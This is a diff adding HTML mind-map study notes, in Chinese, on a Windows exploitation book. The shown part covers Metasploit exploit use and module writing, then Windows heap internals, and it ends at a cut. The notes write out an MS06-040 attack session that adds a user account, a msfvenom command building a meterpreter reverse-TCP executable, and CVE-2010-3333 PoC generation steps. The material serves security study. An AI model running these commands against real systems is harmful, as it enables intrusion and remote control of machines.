@@ -1,0 +1,1460 @@
+<html>
+<head>
+<META http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+<meta content="text/css" http-equiv="Content-Style-Type">
+<title>0day2读书笔记&#13;
+day20190801</title>
+</head>
+<body>
+<h1 align="center" class="root">
+<a name="5t77fdcuqegubcigiiga4ihis0">0day2读书笔记&#13;
+day20190801</a>
+</h1>
+<div align="center" class="globalOverview">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/images/0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801.jpg"></div>
+<h2 class="topic">
+<a name="70bvouf4ftnfhoe7hv4i0eb87m">第四章使用MetaSpolit开发Exploit</a>
+</h2>
+<h3 class="topic">
+<a name="6bakdsjnus5eaoeoo2vfop689g">&nbsp;漏洞利用中的独立过程</a>
+</h3>
+<h3 class="topic">
+<a name="619utjln5aj3v0dqphg7o8q4pt">&nbsp;&nbsp;触发漏洞</a>
+</h3>
+<h3 class="topic">
+<a name="0qntrbe2kdck6ojle3a5rjrgkj">&nbsp;&nbsp;&nbsp;缓冲区多大？偏移多少可以覆盖返回地址？采用什么方法植入代码？</a>
+</h3>
+<h3 class="topic">
+<a name="59ac7vb44pmfnttgg4kjer9969">&nbsp;&nbsp;shellcode类型</a>
+</h3>
+<h3 class="topic">
+<a name="3n9o8stmtdqgustjrkiaqum1cu">&nbsp;&nbsp;&nbsp;bindshell？</a>
+</h3>
+<h3 class="topic">
+<a name="3hbs146jgqhnbuh0vv0lpda4ov">&nbsp;&nbsp;&nbsp;木马download？</a>
+</h3>
+<h3 class="topic">
+<a name="2370v8sa4n5gqshuh6ra3vaeiq">&nbsp;&nbsp;&nbsp;。。。</a>
+</h3>
+<h3 class="topic">
+<a name="3sprjgsv89te35hvl6a9fofmkt">&nbsp;&nbsp;重要参数设置</a>
+</h3>
+<h3 class="topic">
+<a name="3ghsohsibjenol4dsp5m7btsv7">&nbsp;&nbsp;&nbsp;反射shellcode中控制端的ip 端口</a>
+</h3>
+<h3 class="topic">
+<a name="30dqdeni2gq5ng4okdv14ld43t">&nbsp;&nbsp;&nbsp;跳转指令的地址</a>
+</h3>
+<h3 class="topic">
+<a name="6o61luu17ngt4l12r9s0c29fkr">&nbsp;&nbsp;编码、解码算法</a>
+</h3>
+<h3 class="topic">
+<a name="1me2mj8caeh9j2ra4t12ka452a">&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/2ojm8q3bm7208vr6d21r4q393m.png"></p>
+<h3 class="topic">
+<a name="504svkcsfustu9fhgdjqolv5n2">&nbsp;MSF中的模块</a>
+</h3>
+<h3 class="topic">
+<a name="0oavi6js1scsg3eklqvm7i74ct">&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/1ppnjcrbt0uvqbhtl1b3jffifb.png"></p>
+<h3 class="topic">
+<a name="1bg6hsa8kek85opftne9ne2k73">&nbsp;使用msf进行远程攻击</a>
+</h3>
+<h3 class="topic">
+<a name="13v035ve8ljfdm7ch3fqjtjt3k">&nbsp;&nbsp;确定目标主机是否存在漏洞</a>
+</h3>
+<h3 class="topic">
+<a name="4be9nf62unnqqv7ishjjejmv24">&nbsp;&nbsp;&nbsp;通过Nessus进行扫描</a>
+</h3>
+<h3 class="topic">
+<a name="1m3ucqs7phtk30jusdc67t0ein">&nbsp;&nbsp;&nbsp;查看对应系统版本的补丁目录，如果系统打过补丁，则存在漏洞的dll会被卸载到该目录下</a>
+</h3>
+<h3 class="topic">
+<a name="4r4p1dblt36uqepg80115amrkm">&nbsp;&nbsp;图形界面完成攻击（图形界面基于浏览器）</a>
+</h3>
+<h3 class="topic">
+<a name="3cak16at7i9706rbrl2vmb5n39">&nbsp;&nbsp;&nbsp;单击Exploits按钮，搜索对应漏洞序号或漏洞所产生的模块名称，找到对应漏洞的Exploit</a>
+</h3>
+<h3 class="topic">
+<a name="1jf6mmdhleo3e0fngratvd2983">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/6q1rm6ktg00n46thhbokb46e77.png"></p>
+<h3 class="topic">
+<a name="0lkrmajj68gh0tpu1qrdrdlq4n">&nbsp;&nbsp;&nbsp;选择目标主机的系统环境</a>
+</h3>
+<h3 class="topic">
+<a name="6n5ndloi8hu30almcl5i4id54m">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/6l2i6p6or5r2a8kn5de3548h8q.png"></p>
+<h3 class="topic">
+<a name="1gq71svrdqn2uirr02mgt0lpn1">&nbsp;&nbsp;&nbsp;选择需要使用的payload</a>
+</h3>
+<h3 class="topic">
+<a name="53ijuf5a3e3kf823ei7140tk6g">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/5ake9c4srdf52up5usc0ms488k.png"></p>
+<h3 class="topic">
+<a name="7joo2ifr7k5q8vp22f4vm7944i">&nbsp;&nbsp;&nbsp;配置payload</a>
+</h3>
+<h3 class="topic">
+<a name="65vn1535hdlabba5kgj1rsqosp">&nbsp;&nbsp;&nbsp;&nbsp;只有Required标红的选项才是必填的</a>
+</h3>
+<h3 class="topic">
+<a name="055n0816pvlqme63hjib441gao">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/61c85b9a709j0t5mvl3gng9f9q.png"></p>
+<h3 class="topic">
+<a name="73sateb9t72id2nvpqa7tgsta4">&nbsp;&nbsp;&nbsp;点击Launch Exploit</a>
+</h3>
+<h3 class="topic">
+<a name="161jnjchcorj0q1kh4hkqgv6ls">&nbsp;&nbsp;命令行完成攻击</a>
+</h3>
+<h3 class="topic">
+<a name="3f2mlm3gk6rbjcetc86ccb2b5u">&nbsp;&nbsp;&nbsp;help或?显示常用命令说明</a>
+</h3>
+<h3 class="topic">
+<a name="3hga6iusgan4kft50iflkg6g58">&nbsp;&nbsp;&nbsp;show exploits</a>
+</h3>
+<h3 class="topic">
+<a name="6bgnrqqer8pjurr9b8n7gqr56k">&nbsp;&nbsp;&nbsp;use windows/smb/ms06_040_netapi</a>
+</h3>
+<h3 class="topic">
+<a name="71hajcvq1eubgku9cjihisb5fn">&nbsp;&nbsp;&nbsp;info</a>
+</h3>
+<h3 class="topic">
+<a name="04aheab134da194ncvg9tqncd7">&nbsp;&nbsp;&nbsp;&nbsp;显示当前选中的漏洞的描述信息</a>
+</h3>
+<h3 class="topic">
+<a name="6gapk6tqtkgkavkc8irfsv0759">&nbsp;&nbsp;&nbsp;show targets</a>
+</h3>
+<h3 class="topic">
+<a name="6lv8vgh7bltuetme2cbrv2vl7a">&nbsp;&nbsp;&nbsp;&nbsp;显示可以攻击的目的主机的系统版本</a>
+</h3>
+<h3 class="topic">
+<a name="3pjo4tflciec7ef91v58j133f5">&nbsp;&nbsp;&nbsp;set target 0</a>
+</h3>
+<h3 class="topic">
+<a name="0tgrca1mlphkkf9gmsvbsev5bb">&nbsp;&nbsp;&nbsp;&nbsp;设置是使用第0号目标主机操作系统</a>
+</h3>
+<h3 class="topic">
+<a name="2vgugsgadqsabbsaaquhdgciv5">&nbsp;&nbsp;&nbsp;show payload</a>
+</h3>
+<h3 class="topic">
+<a name="0q86mgkcmceso679mbj1d475rq">&nbsp;&nbsp;&nbsp;set payload windows/adduser</a>
+</h3>
+<h3 class="topic">
+<a name="22srl0pagf4e05li826mdon5n2">&nbsp;&nbsp;&nbsp;show options</a>
+</h3>
+<h3 class="topic">
+<a name="4udufdr09lv50qupr6d6uljiuf">&nbsp;&nbsp;&nbsp;&nbsp;显示当前漏洞和payload需要的配置信息</a>
+</h3>
+<h3 class="topic">
+<a name="0nsbkk1ee195st27e12fslosjr">&nbsp;&nbsp;&nbsp;set RHOST 192.168.22.223</a>
+</h3>
+<h3 class="topic">
+<a name="615nik5jieqhm058u22ljm56l8">&nbsp;&nbsp;&nbsp;&nbsp;设置目标主机ip地址</a>
+</h3>
+<h3 class="topic">
+<a name="1shp2cgkjgd565mek1jqpgmuv3">&nbsp;&nbsp;&nbsp;set PASS 123</a>
+</h3>
+<h3 class="topic">
+<a name="0c1jd2srsk55200pp16hlvcdh6">&nbsp;&nbsp;&nbsp;&nbsp;设置添加的账户的密码</a>
+</h3>
+<h3 class="topic">
+<a name="2s1ldf9e5a3qh17c5ibk8brsvm">&nbsp;&nbsp;&nbsp;set USER failwest</a>
+</h3>
+<h3 class="topic">
+<a name="3funifecjk4eoloeh61bi8md8o">&nbsp;&nbsp;&nbsp;&nbsp;设置添加的账户的用户名</a>
+</h3>
+<h3 class="topic">
+<a name="27g1b1p7ngmu5codpo69sn3873">&nbsp;&nbsp;&nbsp;exploit</a>
+</h3>
+<h3 class="topic">
+<a name="4q49ul2155qq3pst9f3s20t3pk">&nbsp;&nbsp;&nbsp;&nbsp;进行攻击</a>
+</h3>
+<h3 class="topic">
+<a name="6vluv9f5jdpp1bauva5goaskig">&nbsp;使用msf制作shellcode（通过图形化界面）</a>
+</h3>
+<h3 class="topic">
+<a name="40olbebs62ack9jr5rjnv96u0a">&nbsp;&nbsp;点击PayLoads按钮，选择需要的shellcode类型</a>
+</h3>
+<h3 class="topic">
+<a name="1telnvprebipo7rojtdrqtgrk1">&nbsp;&nbsp;输入该shellcode的配置参数（以windows/cmd命令为例）</a>
+</h3>
+<h3 class="topic">
+<a name="769iqg7p342ri01lg1it3eab9d">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/5vvj3kfgrhjvnem3ig6i8h82ia.png"></p>
+<h3 class="topic">
+<a name="1hmlk5n7pqe1u3org8in7gtcm6">&nbsp;&nbsp;&nbsp;参数意义</a>
+</h3>
+<h3 class="topic">
+<a name="0mtvm40krcugbpt056jbea0akm">&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/0bet1n132ecp9qfg1sk6qh7flr.png"></p>
+<h3 class="topic">
+<a name="3ie15pl66pnpi7q2u94smgir0m">&nbsp;&nbsp;点击Genreate获得对应格式的shellcode</a>
+</h3>
+<h3 class="topic">
+<a name="1mdiv1gav3mabt0vvs1daocvlc">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/0oatonalhdki327vtftvpbvsd6.png"></p>
+<h3 class="topic">
+<a name="029vjtaah7moqh74peer4sihvb">&nbsp;&nbsp;如果要通过命令行界面得到shellcode可以通过类类似指令：</a>
+</h3>
+<h3 class="topic">
+<a name="3o6ms5qo1dsf5nqpkbvalpf100">&nbsp;&nbsp;&nbsp;msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</a>
+</h3>
+<h3 class="topic">
+<a href="https://www.cnblogs.com/backlion/p/6000544.html" name="7sk5edj4pjpqpv9mmvnuu80jht">&nbsp;&nbsp;&nbsp;https://www.cnblogs.com/backlion/p/6000544.html</a>
+</h3>
+<h3 class="topic">
+<a name="467q9b132627rcgv4groht8thq">&nbsp;使用msf生成POC样本</a>
+</h3>
+<h3 class="topic">
+<a name="1ed981avg95lngldkhb9gnriqq">&nbsp;&nbsp;search cve-2010-3333</a>
+</h3>
+<h3 class="topic">
+<a name="4tmecghhq77p983ibvvb5qenck">&nbsp;&nbsp;use exploit/windows/fileformat/ms10_087_rtf_pfragments_bof </a>
+</h3>
+<h3 class="topic">
+<a name="7b8djvj9pgp9lpk503vl4f20j6">&nbsp;&nbsp;info</a>
+</h3>
+<h3 class="topic">
+<a name="387u72sonfdtg6221k49ark6ns">&nbsp;使用msf中的插件msfpescan在指定模块搜索跳板指令</a>
+</h3>
+<h3 class="topic">
+<a name="4loe8eqsv33kgp99bpgg02avh3">&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/1phft940sbs9vrbgd3s23hv7ef.png"></p>
+<h3 class="topic">
+<a name="4neve875tomhh9d6p1d4h721nj">&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/16oucsoqfic0va5u6c3r9em6t5.png"></p>
+<h3 class="topic">
+<a name="2vr6tdbucqbpcfu52qve02t6e3">&nbsp;ruby语言简单介绍</a>
+</h3>
+<h3 class="topic">
+<a name="5kkii32ng7rkoeuhes6te0boie">&nbsp;&nbsp;msf框架3.0之后使用ruby进行开发，这是一种面向对象的脚本语言</a>
+</h3>
+<h3 class="topic">
+<a name="62lbdgs95h6o4sj640peprjk6s">&nbsp;&nbsp;&nbsp;编译型语言由解释器逐行执行，所以如果代码中存在问题，只有执行到该代码才能触发错误，该代码之前的代码均已被执行</a>
+</h3>
+<h3 class="topic">
+<a name="1ojpcf0n78538jmj0u0dule1em">&nbsp;&nbsp;hellowoeld</a>
+</h3>
+<h3 class="topic">
+<a name="1bp79hqhn2lq9tqubuh051er6d">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/182gaci3fmsl16vpb3og033hj5.png"></p>
+<h3 class="topic">
+<a name="0s9i72dm1sbo6so45i3sk7daah">&nbsp;&nbsp;# 作为注释符</a>
+</h3>
+<h3 class="topic">
+<a name="7aq5fcrv1bls16aovg9ptgei1f">&nbsp;&nbsp;变量</a>
+</h3>
+<h3 class="topic">
+<a name="5fplmrsua18mdvcvlq79dq4kcl">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/296pn4mr2bpru1aqel4vfk1v4g.png"></p>
+<h3 class="topic">
+<a name="02hitdgeq81cm9q69srns60uo7">&nbsp;&nbsp;字符串操作</a>
+</h3>
+<h3 class="topic">
+<a name="46iivt478covompsrpp0sem4dq">&nbsp;&nbsp;数组</a>
+</h3>
+<h3 class="topic">
+<a name="6akk8q1t3jja8h6d8dn55c3u4s">&nbsp;&nbsp;hash表</a>
+</h3>
+<h3 class="topic">
+<a name="65rtt2kkqmbam5i8gqn9shpjeh">&nbsp;&nbsp;模块、类、方法（函数）的定义</a>
+</h3>
+<h3 class="topic">
+<a name="6gsr5amjhddkau37jki46lk3ic">&nbsp;&nbsp;&nbsp;以上内容见书131页</a>
+</h3>
+<h3 class="topic">
+<a name="0u83npbhij5qbmtop7rnnf0hrv">&nbsp;使用ruby开发一个Exploit模块</a>
+</h3>
+<h3 class="topic">
+<a name="5c6af6fbkh3p74cj4sf6di8mj8">&nbsp;&nbsp;被攻击的漏洞程序是自己编写的一个存在缓冲区溢出的tcp服务端，其将0x200字节的数据保存在200字节的数组总引发溢出漏洞</a>
+</h3>
+<h3 class="topic">
+<a name="5asumu07ffgnob9lkb408rs2h5">&nbsp;&nbsp;&nbsp;服务端代码见134页</a>
+</h3>
+<h3 class="topic">
+<a name="3als2b9anvl04oc6lokkv10368">&nbsp;&nbsp;使用ruby语言编写该漏洞的msfExploit模块</a>
+</h3>
+<h3 class="topic">
+<a name="6vct812kbgj5vq8d5ndl4l50m3">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/5ss09aa7cjq5qr4mgfd2ja8dl1.png"></p>
+<h3 class="topic">
+<a name="2arha9cjkolaq90vs6ereptun1">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/1cbd2r926509dsas714a0ijttn.png"></p>
+<h3 class="topic">
+<a name="73q6l075s410oqsimjh2p4imdn">&nbsp;&nbsp;整体框架</a>
+</h3>
+<h3 class="topic">
+<a name="5nl0hqen8vdbc5suj8o2b9pnqa">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/3vgm75ika8oslahn6bt68ngiqf.png"></p>
+<h3 class="topic">
+<a name="46egrrtdv39k022fh25bddkh1o">&nbsp;&nbsp;使用该exploit模块</a>
+</h3>
+<h3 class="topic">
+<a name="69nn0rcm811m06q1mn6rb7ap6d">&nbsp;&nbsp;&nbsp;把我们的模块放到 exploit 目录下面，例如，我这里是 C:\Program Files\Metasp loit\ Framework3\msf3\modules\exploits\failwest\test.rb</a>
+</h3>
+<h3 class="topic">
+<a name="22d56dhqk3v1pr5s5ou691vnum">&nbsp;&nbsp;&nbsp;之后可以通过gui界面或命令行界面使用该exploit模块</a>
+</h3>
+<h3 class="topic">
+<a name="4lnc6qkj6vcei8kfkckh03khb7">&nbsp;使用msf发布poc</a>
+</h3>
+<h3 class="topic">
+<a name="3s68ggqq7ac027gogr81rfq5eb">&nbsp;&nbsp;因为msf为Exploit的开发提供了良好的模板，所有很多poc的发布也采用MSF Exploit模块的形式</a>
+</h3>
+<h3 class="topic">
+<a name="6v0kmoas2qvr710u8ijo1qfm54">&nbsp;&nbsp;与单纯开发msf Exploit模块相比，开发用于发布Poc的Expolit模块会在模块中共包含更多的解释信息与提示，包括poc作者，相关引用，并将实际使用的payload、填充数据等分别以变量名的形式进行提示</a>
+</h3>
+<h3 class="topic">
+<a name="38c0fdfqvairj2dtd79uolgo6d">&nbsp;&nbsp;使用msf exploit模块发布poc（漏洞与上面的相同）</a>
+</h3>
+<h3 class="topic">
+<a name="5g5vg6n5neg4q7hdpnl0t4r8ff">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/0ir7e693u24aceiti5kg72aft1.png"></p>
+<h3 class="topic">
+<a name="3qg49gga8r9u7qlcipju0ge97s">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/4uakseokarqc2o0oq6hu6q338v.png"></p>
+<h2 class="topic">
+<a name="2vgq9i93v15j0jh4o0bnjervd3">第五章堆溢出利用</a>
+</h2>
+<h3 class="topic">
+<a name="353hi67bpcpoqm31cdnuhh4f91">&nbsp;堆的特点</a>
+</h3>
+<h3 class="topic">
+<a name="3k48k6t8nh02nssprhvpc6ao72">&nbsp;&nbsp;需要程序运行时动态分配，其大小不能在程序设计时预先指定，需要参考用户反馈</a>
+</h3>
+<h3 class="topic">
+<a name="2rcnc5hmjks01ehaksdn7ab32i">&nbsp;&nbsp;堆需要程序员通过专用的函数进行申请</a>
+</h3>
+<h3 class="topic">
+<a name="694a6rc5jamogoas3lmea6610e">&nbsp;&nbsp;一般使用一个指针对堆空间进行使用和释放</a>
+</h3>
+<h3 class="topic">
+<a name="65idblue66ugli3tptorpn6as9">&nbsp;&nbsp;使用完毕后需要将指针传给堆释放函数进行释放</a>
+</h3>
+<h3 class="topic">
+<a name="3omm89sk9sisq2aa849sbd38bc">&nbsp;堆和栈的区别</a>
+</h3>
+<h3 class="topic">
+<a name="7t21omfugkp0smb69tdhgsfhds">&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/0ofm6s7691r3qgf2928b4vp5i1.png"></p>
+<h3 class="topic">
+<a name="0a7r5eq3iu9kotke15qd4i102i">&nbsp;堆管理系统的要求</a>
+</h3>
+<h3 class="topic">
+<a name="420p3acqrhem96d0m1oj4i83kg">&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/1amffh24727mddvms5abkugtlj.png"></p>
+<h3 class="topic">
+<a name="3a5bjqiencpsin7eqb0l6ljdbs">&nbsp;操作系统中的堆中数据结构</a>
+</h3>
+<h3 class="topic">
+<a name="6rvl1she356run9kepdhnvgpkm">&nbsp;&nbsp;堆块</a>
+</h3>
+<h3 class="topic">
+<a name="3p60s1qfq1433eb6kqsct3stqi">&nbsp;&nbsp;&nbsp;堆区的内存按照大小不同组成堆块，堆块是堆空间的标识单位（而不是字节）</a>
+</h3>
+<h3 class="topic">
+<a name="3jt7ith2uglki5ntab186vfi4i">&nbsp;&nbsp;&nbsp;一个堆块分为</a>
+</h3>
+<h3 class="topic">
+<a name="5hrdcj9fb34mbbmq684nakt7em">&nbsp;&nbsp;&nbsp;&nbsp;堆首</a>
+</h3>
+<h3 class="topic">
+<a name="7255tmvfti1n1dhms73gme3cqq">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;一个堆块头部的几个字节，用以标识该堆块的相关信息，本块的大小，是否被占用等等</a>
+</h3>
+<h3 class="topic">
+<a name="6h8mnnq43sinfsq2sd3et6kbgg">&nbsp;&nbsp;&nbsp;&nbsp;堆体</a>
+</h3>
+<h3 class="topic">
+<a name="3sl83g2dj4oqf4bh1u5n5fog1q">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;实际用户可以使用的空间，用户通过内存分配函数得到的指针指向堆体的首地址</a>
+</h3>
+<h3 class="topic">
+<a name="20e11ie5vfa2barga7hqb5f90r">&nbsp;&nbsp;堆表</a>
+</h3>
+<h3 class="topic">
+<a name="26is8bpkgjqkpucni6v57enufl">&nbsp;&nbsp;&nbsp;堆表一般位于对堆区的起始位置，用于索引堆块的位置大小、是否被占用</a>
+</h3>
+<h3 class="topic">
+<a name="5aa6sqvrrg7n3doip65gfpqrsj">&nbsp;&nbsp;&nbsp;堆表的数据结构直接影响检索空闲堆、分配堆空间的效率</a>
+</h3>
+<h3 class="topic">
+<a name="0bdig1j33uegpbaemtn0fns0gb">&nbsp;&nbsp;&nbsp;堆表可能会采用平衡二叉树等高级数据结构进行组织，操作系统中堆表可能不仅仅只有一种结构</a>
+</h3>
+<h3 class="topic">
+<a name="12ujeb35b2mo3frng6anaovaok">&nbsp;&nbsp;&nbsp;堆表的种类</a>
+</h3>
+<h3 class="topic">
+<a name="31cbu658qmg59nbf4j0qob2e1s">&nbsp;&nbsp;&nbsp;&nbsp;空闲双向链表（空表）freelist</a>
+</h3>
+<h3 class="topic">
+<a name="0dl3292pokqnkq01lrfoo5jc5s">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;每一个空闲态的堆块在堆首都有两个指针 ，这两个指针将某些空闲堆块链接成双向链表，一条双向链表被称为一条空表</a>
+</h3>
+<h3 class="topic">
+<a name="2al56nfqar72qp6ltop2sqov4n">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;此类空表一共有128条，除了一条特殊的空表，其他在同一条空表中的堆块的大小是相同的，即将相同大小的空闲堆块链接成一条空表</a>
+</h3>
+<h3 class="topic">
+<a name="71t4vrq76pt4ufvm4ndrphvmj7">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;堆区一开始的堆表区中有个一个128项的指针数组，称为空表索引，每个数组元素有两个指针，用于标识一条空表</a>
+</h3>
+<h3 class="topic">
+<a name="163cr7tk8hgjgvb0fk48jds0bk">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;空表索引中第二项对应的空表中所有的空闲堆块大小均为8个字节，第三项对应的空表对应的堆块大小为16字节，即空表索引+1（从1开始），对应空表的堆块大小+8字节</a>
+</h3>
+<h3 class="topic">
+<a name="22t0gnpemrlh4gf57pgg8u43bh">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/77209th24a7g8604va9ja65tns.png"></p>
+<h3 class="topic">
+<a name="2i7opr9958njdurk9345ss8gjn">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;空表索引的第一项比较特殊，该空表链入了所有大于等于1024字节的堆块（小于512kb），空表中按照堆块的大小升序依次进行链入</a>
+</h3>
+<h3 class="topic">
+<a name="21p24k5rfbiorf415c9c1clsih">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/7pdb3qe8tjnrqr2ut1svig6eas.png"></p>
+<h3 class="topic">
+<a name="7tlp33pn2takgt8rg9og4mphaf">&nbsp;&nbsp;&nbsp;&nbsp;快速单向链表（快表）lookaside</a>
+</h3>
+<h3 class="topic">
+<a name="5cs4as5qklbh64dfcrh52im2em">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;主要用于加速windows中堆块分配</a>
+</h3>
+<h3 class="topic">
+<a name="7ouv78p0hg60v02un31e8snenm">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;之所以可以加快内存分配	，是因为快表中堆块均不会发生堆块合并（通过将空闲堆块的块受设置为占用态，以此防止堆块合并）</a>
+</h3>
+<h3 class="topic">
+<a name="0oehi4tb2snepdb5trrs40v6eu">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;快表也有128条，也有快表索引，结构与空表类似，只不过以单链表进行数据组织</a>
+</h3>
+<h3 class="topic">
+<a name="7alur1cmflmq400q18up3vj86b">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;每条快表最多只有四个节点，很快会被占满</a>
+</h3>
+<h3 class="topic">
+<a name="20mhfnr0531ibcssgs7hjd3dkd">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/28bkb5622i446dtol899lt38r3.png"></p>
+<h3 class="topic">
+<a name="16tldgp9i21bkbqqclkhmnhbkh">&nbsp;&nbsp;堆的内存组织</a>
+</h3>
+<h3 class="topic">
+<a name="3j599ao0qhnhghkppmpfk0ocd6">&nbsp;&nbsp;&nbsp;</a>
+</h3>
+<p class="topicImage">
+<img src="0day2%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0 day20190801_files/3of1qm62ko0t0ke9i4cqmdoted.png"></p>
+<h3 class="topic">
+<a name="4jr8pcl3op9kmuudjq7gi72dmh">&nbsp;&nbsp;&nbsp;占用态的堆块被其占用的程序索引</a>
+</h3>
+<h3 class="topic">
+<a name="2idti8s1murku9u9oshgg3ie8s">&nbsp;&nbsp;&nbsp;堆表只能索引所有空闲态的堆块</a>
+</h3>
+<h3 class="topic">
+<a name="3lasb6jm3l4i0jkppl12lm7q8q">&nbsp;堆中的操作</a>
+</h3>
+<h3 class="topic">
+<a name="1iuemgtvh0i78b3h7e9jkj98o5">&nbsp;&nbsp;堆块分配</a>
+</h3>
+<h3 class="topic">
+<a name="331vg668pqbt0fbahtvtu8b4di">&nbsp;&nbsp;&nbsp;程序员提交申请并执行</a>
+</h3>
+<h3 class="topic">
+<a name="5jqoumb46b5rovrjq84ea5qkol">&nbsp;&nbsp;&nbsp;分类</a>
+</h3>
+<h3 class="topic">
+<a name="63q8pcmlm3o81ur4v4fhlopcd4">&nbsp;&nbsp;&nbsp;&nbsp;快表分配</a>
+</h3>
+<h3 class="topic">
+<a name="10pj32bibns9ehsnppf2rh8ee1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从快表中分配堆块比较简单，包括寻找到大小匹配的空闲堆块、将其状态修改为占用态、 把它从堆表中&ldquo;卸下&rdquo;、最后返回一个指向堆块块身的指针给程序使用。 </a>
+</h3>
+<h3 class="topic">
+<a name="5b80q5mp5mdinn2au3q80g288l">&nbsp;&nbsp;&nbsp;&nbsp;普通空表分配</a>
+</h3>
+<h3 class="topic">
+<a name="5rc47hlbpnm617eveg1rta20cc">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;普通空表分配时首先寻找最优的空闲块分配，若失败，则寻找次优的空闲块分配，即最小的能够满足要求的空闲块</a>
+</h3>
+<h3 class="topic">
+<a name="087ip30201uvjnmif6ohagr8fu">&nbsp;&nbsp;&nbsp;&nbsp;0号空表分配</a>
+</h3>
+<h3 class="topic">
+<a name="2turjopo7pa6pvt9h9ulssbal1">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;零号空表中按照大小升序链着大小不同的空闲块，故在分配时先从 free[0]反向查找最后一个块（即表中最大块），看能否满足要求，如果能满足要求，再正向搜索最小能够满足要求的 空闲堆块进行分配（这就明白为什么零号空表要按照升序排列了）</a>
+</h3>
+<h3 class="topic">
+<a name="2thpv2d1ddastvnmc6utelk809">&nbsp;&nbsp;&nbsp;堆块分配过程中&ldquo;找零&rdquo;情况</a>
+</h3>
+<h3 class="topic">
